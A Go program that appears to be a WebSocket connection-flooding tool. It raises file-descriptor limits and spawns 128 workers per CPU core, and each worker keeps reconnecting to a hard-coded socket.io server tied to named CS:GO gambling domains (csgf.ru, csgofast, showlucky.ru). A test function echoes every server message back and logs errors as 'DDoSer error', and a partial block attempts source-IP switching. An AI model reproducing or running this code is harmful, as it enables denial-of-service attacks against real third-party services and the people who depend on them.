package main

import (
	"log"
	"net/http"
	"time"
	"fmt"
	"sync"
	"net"
	"syscall"
	"runtime"

	"net/url"
	"os"
	"os/signal"
	"github.com/gorilla/websocket"
)

func main() {
	l := log.New(os.Stdout, "[MOTHER THREAD]: ", log.Ldate | log.Ltime | log.Lmicroseconds)
	defer l.Print("Stopped!")
	l.Print("Started!")
	c := make( chan bool, 1 )
	u := &url.URL {
		Scheme: "ws",
		Host: "104.24.108.184:2082",
        Path: "/socket.io/",
		RawQuery: "EIO=3&transport=websocket",
	}
	itr := make(chan os.Signal)
	signal.Notify( itr, os.Interrupt )
	wg := &sync.WaitGroup{}
	max_cpu := runtime.NumCPU()
	runtime.GOMAXPROCS(max_cpu)

	rl := &syscall.Rlimit{}
	if e := syscall.Getrlimit(syscall.RLIMIT_NOFILE, rl); e == nil {
		l.Print( "Finded system limits: ", rl )
		rl.Cur = 10240
		rl.Max = 10240
		if e = syscall.Setrlimit(syscall.RLIMIT_NOFILE, rl); e == nil {
			if e := syscall.Getrlimit(syscall.RLIMIT_NOFILE, rl); e == nil {
				l.Print( "Rlimit updated: ", rl )
			} else { l.Printf( "Error getting #2 rlimit! (%s)", e ); return }
		} else { l.Printf( "Error setting rlimit! (%s)", e ); return }
	} else { l.Printf( "Error in getting rlimit! (%s)", e ); return }

	for i:=0; i<max_cpu; i++ {
		go func( i int ) {
			for k:=uint16(0); k<128; k++ {
				go worker( c, u, i, k, wg )
				time.Sleep(time.Millisecond*100)
			}
		}(i)
	}

//	go worker( c, u, 0, 0, wg )

	for {
		select {
		case <-itr:
			l.Print("Received INTERRUPT from kernel!!!")
			close(c)
			l.Print("DROP signals have been sended to workers!")
			wg.Wait()
			return
		}
	}
	os.Exit(0)
}


func worker(c chan bool, u *url.URL, nc int, nt uint16, w *sync.WaitGroup ) {
	defer w.Done()
	w.Add(1)
	l := log.New(os.Stdout, fmt.Sprintf( "[Worker #%d-%d] ", nc, nt ), log.Ldate | log.Ltime | log.Lmicroseconds)
	defer l.Print("INF: Worker stopped!")
	l.Print( "INF: Worker has been initialized!" )
	for {
		select {
		case cm:=<-c:
			switch(cm) {
			case false:
				l.Print("Worker has been blocked by DROP signal")
				return
			}
		default:
			l.Print("INF: Spawn connector ...")
			if ! connector(c, u, l) {
				l.Print("ERR: I have some errors in my connector.")
				time.Sleep(time.Second * 1)
				l.Print("INF: Try reconnect ...")
			} else {
				l.Print("INF: Recieved STOP signal!")
				w.Done()
				return
			}
		}
	}
}

func connector(ch chan bool, u *url.URL, l *log.Logger) ( bool ) {
	h := make( http.Header )
	h.Set("Origin", u.Host)
	h.Set("Host", "csgf.ru:2082")
	h.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0")

/// PRE RELEASE Changer SIP of ws client
	i, e := net.InterfaceByName("eno1"); if e != nil { l.Printf( "EE! Error in getting interfaces! (%s)", e ) }
	a, e := i.Addrs(); if e != nil {
		l.Printf( "EE! Error in getting IP addresses (%s)", e )
	} else { l.Print(a)	}
	l.Print( a[0] ) // debug log : IP

	an, _, e := net.ParseCIDR( a[1].String() )
	l.Print("AN ", an ,e )
	ad, e := net.ResolveTCPAddr( "tcp4", an.String() + ":0" )
	l.Print("AD", ad, e)

	nd := &net.Dialer{ LocalAddr: ad }
	wd := &websocket.Dialer{
		NetDial: func( n, a string ) ( net.Conn, error ) {
			if cn, e := nd.Dial("tcp", a); e == nil {
				return cn, nil
			} else { return nil, e }
		},
	}
	l.Print(wd)
///	PRE RELEASE

	l.Printf("Connector initialized! Connecting to %s ...", u.Host)

	c, _, e := websocket.DefaultDialer.Dial(u.String(), h)
	//_, _, _ = wd.Dial(u.String(), h)
	if e == nil {
		l.Print("Connection established successfully!")
	} else { l.Printf("Connection failed! (%s)", e); return false }
	defer l.Printf( "Disconnected from %s successfully!", u.Host )
	defer c.Close() // Connection only established!

	wsping := time.NewTicker( time.Second * 10 )
	defer wsping.Stop()

	for {
		select {
		case <-wsping.C:
			if e := c.WriteMessage( websocket.TextMessage, []byte("2") ); e != nil {
				defer c.Close()
				l.Printf( "Something wrong in pinger! (%s)", e )
				return false
			}
		case cm := <-ch:
			switch(cm) {
			case false:
				defer c.Close()
				defer wsping.Stop()
				l.Print("Connector received DROP signal from worker!")
				return true
			}
		default: // reader
			if _, m, e := c.ReadMessage(); e == nil {
				if len(m) == 0 {
					defer c.Close()
					l.Print("Message has zero length");
					return false
				} else { } //c.WriteMessage( websocket.TextMessage, m ); }

				switch( m[0] ) {
				case '3':
					l.Print("Received PONG from server")
				case '4':
					l.Printf( "Meassage from server: %s", m )
				default:
					l.Printf( "Undefined message from server! (%s)", m )
				}
			} else {
				defer c.Close()
				l.Printf( "Something wrong in reader! (%s)", e )
				return false
			}
		}
	}
}


/* My OWN TESTS :

	log.Print("1")
	log.SetPrefix("123: ")
	log.Print("666")
	log.Print(log.Prefix())


////////////////////////////////////////////
	ch := make(chan int)
	go func(ch chan int) {
		for i:=0; i<12; i++ {
			time.Sleep(time.Millisecond*1000)
			log.Print(<-ch)
		}
	}(ch)

	for i:=0; i<10; i++ {
		log.Printf( "FOR i - %d", i )
		ch <- i
	}


	log.Print("I'm all")
	time.Sleep(time.Second * 30)




*/
/*
engine.io message type:
    open =0
    close =1
    ping =2
    pong =3
    message =4
    upgrade =5
    noop =6

socket.io message type:
    connect = 0
    disconnect = 1
    event = 2
    ack = 3
    error = 4
    binary_event = 5
    binary_ack = 6

So, "52" means UPGRADE_EVENT and "40" is MESSAGE_CONNECT. Typically, server messages start with "42", which is MESSAGE_EVENT. PING and PONG don't require a socket.io message. I wonder if UPGRADE works like that too.
*/

func wsmessager(ch chan []byte) {
	log.Printf("messager: %s", string( <-ch ) )
}

/*
curl 'https://server02.csgofast.in/socket.io/?EIO=3&transport=polling&t=LViqkVO&sid=yb5h25etLlcunSPlBfqO' -H 'Host: server02.csgofast.in' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0' -H 'Origin: https://csgofast.ru' -H 'Connection: keep-alive'
*/
const (
writeWait = time.Second
)

func wstester() {
	log.Print("Started WStester function")
	defer log.Print("Stopped WStester function")

	interrupt := make( chan os.Signal, 1 )
	signal.Notify( interrupt, os.Interrupt )
	//https://server03.csgofast.in/socket.io/?EIO=3&transport=websocket&sid=g0axDuj6Df05mvotArKi
	u := url.URL{
		Scheme: "ws",
		Host: "showlucky.ru:2020",
        Path: "/socket.io/",
		RawQuery: "EIO=3&transport=websocket",
	}
	h := make(http.Header)
	h.Set("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0")
	h.Set("Origin", "https://csgofast.ru")
	log.Printf("Connecting to %s ...", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), h)
	if err != nil {
	//	log.Print(r.StatusCode)
	//	log.Print(r.Status)
	//	log.Print(r.Close)
	//	log.Print(r.ContentLength)
//		log.Print(r.Body)
		log.Fatalf("Dial Error: %s", err)
	} else { log.Printf("Successfully connected to %s", u.String()) }
	defer c.Close()

	messager := make( chan []byte)
	go wsmessager(messager)

	go func() {
		for {
			if _, mess, err := c.ReadMessage(); err == nil {
				switch mess[0] {
					case '3':
					//	log.Print("Server send <pong>")
					case '4':
					//	messager <- mess
						log.Printf("Server's message: %s", mess)
					default:
						log.Printf("Undefinded message: %s", mess)
						if err := c.WriteMessage(websocket.TextMessage, []byte("2")); err != nil { log.Fatalf("Pinger error! (%s)", err) }
				}
				if err := c.WriteMessage(websocket.TextMessage, mess); err != nil { log.Printf("DDoSer error! (%s)", err) }
			} else {
				log.Printf("Message - %d", len(mess))
				log.Printf("Error from server: %s", err)
				c.Close(); panic("Fail")
			}
		}
	}()

	wspinger := time.NewTicker(time.Second*10)
	defer wspinger.Stop()

	for {
		select {
		case a := <-wspinger.C:
			if err := c.WriteMessage(websocket.TextMessage, []byte("2")); err != nil { log.Fatalf("Pinger error! (%s)", err) }
			log.Printf("%s: <ping> sended", a.String())
		case <-interrupt:
			log.Println("WSclient has been interrupted! Closing connections ...")
			if err := c.WriteMessage( websocket.CloseMessage, websocket.FormatCloseMessage( websocket.CloseNormalClosure, "" ) ); err != nil {
				log.Printf("Some problems with closing ws connection: %s", err)
			} else {
				log.Print("WSconnection closed, good bye!")
				c.Close(); return
			}
		}
	}
}
